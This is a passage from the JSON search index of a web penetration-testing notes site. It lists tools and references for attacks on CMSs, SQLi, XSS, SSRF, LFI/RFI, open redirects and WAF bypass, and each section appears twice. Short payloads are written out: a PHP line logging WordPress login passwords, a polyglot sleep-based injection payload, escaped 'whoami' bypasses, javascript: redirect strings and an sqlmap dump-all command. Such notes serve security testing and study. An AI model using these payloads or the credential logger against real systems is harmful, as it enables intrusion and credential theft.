Exploitation (Chrome/Safari): https://github.com/vngkv123/aSiagaming","title":"Browser Exploitation"},{"location":"web/cms/","text":"CMS Drupal PHP Code Execution Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b Tools Droopescan - https://github.com/droope/droopescan Wordpress Log passwords from wp-login.php file_put_contents( creds.txt ,$_POST['log']. - .$_POST['pwd']) Tools WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes Joomla Tools Droopescan - https://github.com/droope/droopescan Moodle Tools Droopescan - https://github.com/droope/droopescan SilverStripe Tools Droopescan - https://github.com/droope/droopescan","title":"CMS"},{"location":"web/cms/#cms","text":"","title":"CMS"},{"location":"web/cms/#drupal","text":"","title":"Drupal"},{"location":"web/cms/#php-code-execution","text":"Enable\u200b PHP Filter\u200b module on the \u200b Modules\u200b Add content\u200b then to \u200b Article Pasting PHP into the article body Changing the \u200b Text format\u200b to \u200bPHP code\u200b Clicking on \u200b Preview\u200b","title":"PHP Code Execution"},{"location":"web/cms/#tools","text":"Droopescan - https://github.com/droope/droopescan","title":"Tools"},{"location":"web/cms/#wordpress","text":"Log passwords from wp-login.php file_put_contents( creds.txt ,$_POST['log']. - .$_POST['pwd'])","title":"Wordpress"},{"location":"web/cms/#tools_1","text":"WPScan - https://github.com/wpscanteam/wpscan Droopescan - https://github.com/droope/droopescan wpBullet - Static code analysis for WordPress Plugins/Themes","title":"Tools"},{"location":"web/cms/#joomla","text":"","title":"Joomla"},{"location":"web/cms/#tools_2","text":"Droopescan - https://github.com/droope/droopescan","title":"Tools"},{"location":"web/cms/#moodle","text":"","title":"Moodle"},{"location":"web/cms/#tools_3","text":"Droopescan - https://github.com/droope/droopescan","title":"Tools"},{"location":"web/cms/#silverstripe","text":"","title":"SilverStripe"},{"location":"web/cms/#tools_4","text":"Droopescan - https://github.com/droope/droopescan","title":"Tools"},{"location":"web/discovery/","text":"Discovery Tools Files and Folders Gobuster: https://github.com/OJ/gobuster DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster Parameters WFuzz - Identity parameter names \u200b wfuzz -c -z file,burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt Interesting files pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK Technology WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb Site Mapping skipfish References Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad","title":"Discovery"},{"location":"web/discovery/#discovery","text":"","title":"Discovery"},{"location":"web/discovery/#tools","text":"","title":"Tools"},{"location":"web/discovery/#files-and-folders","text":"Gobuster: https://github.com/OJ/gobuster DirBuster: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project EroDir: A fast web directory/file enumeration tool written in Rust: https://github.com/PinkP4nther/EroDir DeepSearch: https://github.com/m4ll0k/DeepSearch Filebuster - An extremely fast and flexible web fuzzer: https://github.com/henshin/filebuster","title":"Files and Folders"},{"location":"web/discovery/#parameters","text":"WFuzz - Identity parameter names \u200b wfuzz -c -z file,burp-parameter-names.txt --hh=19 http://10.10.10.69/sync?FUZZ=writeup Word-lists https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt","title":"Parameters"},{"location":"web/discovery/#interesting-files","text":"pyHAWK: Searches the directory of choice for interesting files. Such as database files and files with passwords stored on them: https://github.com/MetaChar/pyHAWK","title":"Interesting files"},{"location":"web/discovery/#technology","text":"WhatWeb - recognises web technologies ( versions): https://github.com/urbanadventurer/WhatWeb","title":"Technology"},{"location":"web/discovery/#site-mapping","text":"skipfish","title":"Site Mapping"},{"location":"web/discovery/#references","text":"Hidden directories and files as a source of sensitive information about web application: https://medium.com/@_bl4de/hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application-84e5c534e5ad","title":"References"},{"location":"web/sharepoint/","text":"Sharepoint Important Locations /_layouts/viewlsts.aspx\u200b","title":"Sharepoint"},{"location":"web/sharepoint/#sharepoint","text":"","title":"Sharepoint"},{"location":"web/sharepoint/#important-locations","text":"/_layouts/viewlsts.aspx\u200b","title":"Important Locations"},{"location":"web/ssl-tls/","text":"SSL/TLS Tools sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain","title":"SSL/TLS"},{"location":"web/ssl-tls/#ssltls","text":"","title":"SSL/TLS"},{"location":"web/ssl-tls/#tools","text":"sslyze - Fast and powerful SSL/TLS server scanning library. testssl.sh - Checks any port for the support of TLS/SSL ciphers, protocols as well as recent cryptographic flaws Build a valid SSL certificate chain (or fix an incomplete chain): https://github.com/trimstray/mkchain","title":"Tools"},{"location":"web/x-Bypass/","text":"Defense Bypass WAF Bypass Collections PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/ Bypass Rate Limiting Headers X-Remote-IP: IP","title":"Defense Bypass"},{"location":"web/x-Bypass/#defense-bypass","text":"","title":"Defense Bypass"},{"location":"web/x-Bypass/#waf-bypass-collections","text":"PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings Web Application Firewall (WAF) Evasion Techniques: https://medium.com/secjuice/waf-evasion-techniques-718026d693d8 Web Application Firewall (WAF) Evasion Techniques #2: https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0 Web Application Firewall (WAF) Evasion Techniques #3: https://www.secjuice.com/web-application-firewall-waf-evasion/","title":"WAF Bypass Collections"},{"location":"web/x-Bypass/#bypass-rate-limiting","text":"","title":"Bypass Rate Limiting"},{"location":"web/x-Bypass/#headers","text":"X-Remote-IP: IP","title":"Headers"},{"location":"web/x-Defense/","text":"Defense References Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF","title":"Defense"},{"location":"web/x-Defense/#defense","text":"","title":"Defense"},{"location":"web/x-Defense/#references","text":"Awesome-WAF - A curated list of awesome web-app firewall (WAF) stuff: https://github.com/0xInfection/Awesome-WAF","title":"References"},{"location":"web/y-Tools/","text":"Tools Burp Suite Extensions Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder References Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf Password Attacks W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute ADAPT ADAPT is a tool that performs automated Penetration Testing for WebApps. * OTG-IDENT-004 \u2013 Account Enumeration * OTG-AUTHN-001 - Testing for Credentials Transported over an Encrypted Channel * OTG-AUTHN-002 \u2013 Default Credentials * OTG-AUTHN-003 - Testing for Weak lock out mechanism * OTG-AUTHZ-001 \u2013 Directory Traversal * OTG-CONFIG-002 - Test Application Platform Configuration * OTG-CONFIG-006 \u2013 Test HTTP Methods * OTG-CRYPST-001 - Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection * OTG-CRYPST-002 - Testing for Padding Oracle * OTG-ERR-001 - Testing for Error Code * OTG-ERR-002 \u2013 Testing for Stack Traces * OTG-INFO-002 \u2013 Fingerprinting the Webserver * OTG-INPVAL-001 - Testing for Reflected Cross site scripting * OTG-INPVAL-002 - Testing for Stored Cross site scripting * OTG-INPVAL-003 \u2013 HTTP Verb Tampering * OTG-SESS-001 - Testing for Session Management Schema * OTG-SESS-002 \u2013 Cookie Attributes GitHub: https://github.com/secdec/adapt Hawkeye Project security, vulnerability and general risk highlighting tool. It is meant to be integrated into your pre-commit hooks and your pipelines. GitHub: https://github.com/hawkeyesec/scanner-cli Other Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker Practice Tools https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA","title":"Tools"},{"location":"web/y-Tools/#tools","text":"","title":"Tools"},{"location":"web/y-Tools/#burp-suite","text":"","title":"Burp Suite"},{"location":"web/y-Tools/#extensions","text":"Extensions: https://github.com/snoopysecurity/awesome-burp-extensions Turbo Intruder: https://github.com/PortSwigger/turbo-intruder","title":"Extensions"},{"location":"web/y-Tools/#references","text":"Burp Suite Pro Real-life tips tricks: https://www.agarri.fr/docs/HiP2k13-Burp_Pro_Tips_and_Tricks.pdf","title":"References"},{"location":"web/y-Tools/#password-attacks","text":"W3brute - Automatic Web Application Brute Force Attack Tool: https://github.com/aprilahijriyan/w3brute","title":"Password Attacks"},{"location":"web/y-Tools/#adapt","text":"ADAPT is a tool that performs automated Penetration Testing for WebApps. * OTG-IDENT-004 \u2013 Account Enumeration * OTG-AUTHN-001 - Testing for Credentials Transported over an Encrypted Channel * OTG-AUTHN-002 \u2013 Default Credentials * OTG-AUTHN-003 - Testing for Weak lock out mechanism * OTG-AUTHZ-001 \u2013 Directory Traversal * OTG-CONFIG-002 - Test Application Platform Configuration * OTG-CONFIG-006 \u2013 Test HTTP Methods * OTG-CRYPST-001 - Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection * OTG-CRYPST-002 - Testing for Padding Oracle * OTG-ERR-001 - Testing for Error Code * OTG-ERR-002 \u2013 Testing for Stack Traces * OTG-INFO-002 \u2013 Fingerprinting the Webserver * OTG-INPVAL-001 - Testing for Reflected Cross site scripting * OTG-INPVAL-002 - Testing for Stored Cross site scripting * OTG-INPVAL-003 \u2013 HTTP Verb Tampering * OTG-SESS-001 - Testing for Session Management Schema * OTG-SESS-002 \u2013 Cookie Attributes GitHub: https://github.com/secdec/adapt","title":"ADAPT"},{"location":"web/y-Tools/#hawkeye","text":"Project security, vulnerability and general risk highlighting tool. It is meant to be integrated into your pre-commit hooks and your pipelines. GitHub: https://github.com/hawkeyesec/scanner-cli","title":"Hawkeye"},{"location":"web/y-Tools/#other","text":"Adobe Experience Manager (AEM) hacker toolset: https://github.com/0ang3el/aem-hacker","title":"Other"},{"location":"web/y-Tools/#practice-tools","text":"https://www.owasp.org/index.php/OWASP_Hacking_Lab http://www.dvwa.co.uk/ http://www.itsecgames.com/ Damn Vulnerable Serverless Application: https://www.owasp.org/index.php/OWASP_DVSA https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA","title":"Practice Tools"},{"location":"web/z-References/","text":"References General CSS 30 Seconds of CSS - A curated collection of useful CSS snippets you can understand in 30 seconds or less: https://30-seconds.github.io/30-seconds-of-css/","title":"References"},{"location":"web/z-References/#references","text":"","title":"References"},{"location":"web/z-References/#general","text":"","title":"General"},{"location":"web/z-References/#css","text":"30 Seconds of CSS - A curated collection of useful CSS snippets you can understand in 30 seconds or less: https://30-seconds.github.io/30-seconds-of-css/","title":"CSS"},{"location":"web/scenario/change-password/","text":"Change Password","title":"Change Password"},{"location":"web/scenario/change-password/#change-password","text":"","title":"Change Password"},{"location":"web/scenario/forgot-password/","text":"Forgot Password","title":"Forgot Password"},{"location":"web/scenario/forgot-password/#forgot-password","text":"","title":"Forgot Password"},{"location":"web/scenario/login/","text":"Login","title":"Login"},{"location":"web/scenario/login/#login","text":"","title":"Login"},{"location":"web/scenario/register/","text":"Registration","title":"Registration"},{"location":"web/scenario/register/#registration","text":"","title":"Registration"},{"location":"web/scenario/remember-me/","text":"Remember Me","title":"Remember Me"},{"location":"web/scenario/remember-me/#remember-me","text":"","title":"Remember Me"},{"location":"web/vulnerabilities/command-injection/","text":"Command Injection Pypass Filter w\\h\\o\\a\\m\\i \\w\\h\\o\\a\\m\\i Commix GitHub: https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples","title":"Command injection"},{"location":"web/vulnerabilities/command-injection/#command-injection","text":"","title":"Command Injection"},{"location":"web/vulnerabilities/command-injection/#pypass-filter","text":"w\\h\\o\\a\\m\\i \\w\\h\\o\\a\\m\\i","title":"Pypass Filter"},{"location":"web/vulnerabilities/command-injection/#commix","text":"GitHub: https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples","title":"Commix"},{"location":"web/vulnerabilities/crlf/","text":"CRLF Introduction https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28 Tools CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector Payloads CRLF-Injection-Payloads: https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt","title":"CRLF"},{"location":"web/vulnerabilities/crlf/#crlf","text":"","title":"CRLF"},{"location":"web/vulnerabilities/crlf/#introduction","text":"https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28","title":"Introduction"},{"location":"web/vulnerabilities/crlf/#tools","text":"CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector","title":"Tools"},{"location":"web/vulnerabilities/crlf/#payloads","text":"CRLF-Injection-Payloads: https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt","title":"Payloads"},{"location":"web/vulnerabilities/csrf/","text":"CSRF Tools XSRFProbe: https://github.com/0xInfection/XSRFProbe References Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/","title":"CSRF"},{"location":"web/vulnerabilities/csrf/#csrf","text":"","title":"CSRF"},{"location":"web/vulnerabilities/csrf/#tools","text":"XSRFProbe: https://github.com/0xInfection/XSRFProbe","title":"Tools"},{"location":"web/vulnerabilities/csrf/#references","text":"Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/","title":"References"},{"location":"web/vulnerabilities/lfi-rfi/","text":"LFI / RFI LFI to RCE RCE with TXT upload Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include) RCE with Logs Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion) RCE over SQLi Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi References Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134","title":"LFI / RFI"},{"location":"web/vulnerabilities/lfi-rfi/#lfi-rfi","text":"","title":"LFI / RFI"},{"location":"web/vulnerabilities/lfi-rfi/#lfi-to-rce","text":"","title":"LFI to RCE"},{"location":"web/vulnerabilities/lfi-rfi/#rce-with-txt-upload","text":"Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include)","title":"RCE with TXT upload"},{"location":"web/vulnerabilities/lfi-rfi/#rce-with-logs","text":"Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion)","title":"RCE with Logs"},{"location":"web/vulnerabilities/lfi-rfi/#rce-over-sqli","text":"Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi","title":"RCE over SQLi"},{"location":"web/vulnerabilities/lfi-rfi/#references","text":"Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134","title":"References"},{"location":"web/vulnerabilities/open-redirect/","text":"Open Redirect Scenarios Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices Bypasses https%3A%2F%2Fmysite.com%2F https%3A%2F%2Fexample.com%2F%3Freturnurl%3D%2F%2Fmysite.com%2F \\/yoururl.com \\/\\/yoururl.com \\\\yoururl.com //yoururl.com //theirsite@yoursite.com https://yoursite?c=.theirsite.com/ https://yoursite.com#.theirsite.com/ https://yoursite.com\\.thersite.com/ //%2F/yoursite.com ////yoursite.com https://theirsite.computer/ - (if they just check for *theirsite.com*, .computer is a valid tld! https://theirsite.com.mysite.com - (Treat their domain as subdomain to yours) /%0D/yoursite.com - (Also try %09, %00, %0a, %07) java%0d%0ascript%0d%0a:alert(0), j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` ,java%07script:prompt`0` ,java%09scrip%07t:prompt`0` https://www.bugbountynotes.com/training/tutorial?id=1","title":"Open Redirect"},{"location":"web/vulnerabilities/open-redirect/#open-redirect","text":"","title":"Open Redirect"},{"location":"web/vulnerabilities/open-redirect/#scenarios","text":"Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices","title":"Scenarios"},{"location":"web/vulnerabilities/open-redirect/#bypasses","text":"https%3A%2F%2Fmysite.com%2F https%3A%2F%2Fexample.com%2F%3Freturnurl%3D%2F%2Fmysite.com%2F \\/yoururl.com \\/\\/yoururl.com \\\\yoururl.com //yoururl.com //theirsite@yoursite.com https://yoursite?c=.theirsite.com/ https://yoursite.com#.theirsite.com/ https://yoursite.com\\.thersite.com/ //%2F/yoursite.com ////yoursite.com https://theirsite.computer/ - (if they just check for *theirsite.com*, .computer is a valid tld! https://theirsite.com.mysite.com - (Treat their domain as subdomain to yours) /%0D/yoursite.com - (Also try %09, %00, %0a, %07) java%0d%0ascript%0d%0a:alert(0), j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` ,java%07script:prompt`0` ,java%09scrip%07t:prompt`0` https://www.bugbountynotes.com/training/tutorial?id=1","title":"Bypasses"},{"location":"web/vulnerabilities/put/","text":"PUT Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/","title":"PUT"},{"location":"web/vulnerabilities/put/#put","text":"","title":"PUT"},{"location":"web/vulnerabilities/put/#multiple-ways-to-exploiting-put-method-httpswwwhackingarticlesinmultiple-ways-to-exploiting-put-method","text":"","title":"Multiple Ways to Exploiting PUT Method - https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/"},{"location":"web/vulnerabilities/sql-injection/","text":"SQL Injection Tools SqlMap: sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner Payload Combines blind command injection and blind sql injection ( mysql ) in one payload (works with no quotes/single quotes and double quotes): /*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||' ||sleep(5)|| ` https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065 Techniques Add a trigger to do a malicious action (price 0) Language Specific PHP Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)","title":"SQL Injection"},{"location":"web/vulnerabilities/sql-injection/#sql-injection","text":"","title":"SQL Injection"},{"location":"web/vulnerabilities/sql-injection/#tools","text":"SqlMap: sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner","title":"Tools"},{"location":"web/vulnerabilities/sql-injection/#payload","text":"Combines blind command injection and blind sql injection ( mysql ) in one payload (works with no quotes/single quotes and double quotes): /*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||' ||sleep(5)|| ` https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065","title":"Payload"},{"location":"web/vulnerabilities/sql-injection/#techniques","text":"Add a trigger to do a malicious action (price 0)","title":"Techniques"},{"location":"web/vulnerabilities/sql-injection/#language-specific","text":"","title":"Language Specific"},{"location":"web/vulnerabilities/sql-injection/#php","text":"Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/)","title":"PHP"},{"location":"web/vulnerabilities/ssrf/","text":"SSRF Tools https://github.com/swisskyrepo/SSRFmap References SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739","title":"SSRF"},{"location":"web/vulnerabilities/ssrf/#ssrf","text":"","title":"SSRF"},{"location":"web/vulnerabilities/ssrf/#tools","text":"https://github.com/swisskyrepo/SSRFmap","title":"Tools"},{"location":"web/vulnerabilities/ssrf/#references","text":"SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739","title":"References"},{"location":"web/vulnerabilities/xss/","text":"XSS Tools - Most advanced XSS detection suite: https://github.com/s0md3v/XSStrike XSS Payloads Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/ XSS via Image XSS via HTTP Response Splitting XSS via Cookie XSS via AngularJS Template Injection Impact [Basic] - https://somdev.me/21-things-xss/","title":"XSS"},{"location":"web/vulnerabilities/xss/#xss","text":"","title":"XSS"},{"location":"web/vulnerabilities/xss/#tools","text":"","title":"Tools"},{"location":"web/vulnerabilities/xss/#-most-advanced-xss-detection-suite-httpsgithubcoms0md3vxsstrike","text":"","title":"- Most advanced XSS detection suite: https://github.com/s0md3v/XSStrike"},{"location":"web/vulnerabilities/xss/#xss-payloads","text":"Fetch an external resource: https://github.com/aurainfosec/xss_payloads/blob/master/fetch.md Advance XSS Persistence With Oauth: https://github.com/dxa4481/XSSOauthPersistence https://blog.secureideas.com/2018/12/twelve-days-of-xssmas.html XSS Cheat Sheet: https://brutelogic.com.br/blog/xss-cheat-sheet/","title":"XSS Payloads"},{"location":"web/vulnerabilities/xss/#xss-via-image","text":"","title":"XSS via Image"},{"location":"web/vulnerabilities/xss/#xss-via-http-response-splitting","text":"","title":"XSS via HTTP Response Splitting"},{"location":"web/vulnerabilities/xss/#xss-via-cookie","text":"","title":"XSS via Cookie"},{"location":"web/vulnerabilities/xss/#xss-via-angularjs-template-injection","text":"","title":"XSS via AngularJS Template Injection"},{"location":"web/vulnerabilities/xss/#impact","text":"[Basic] - https://somdev.me/21-things-xss/","title":"Impact"}]}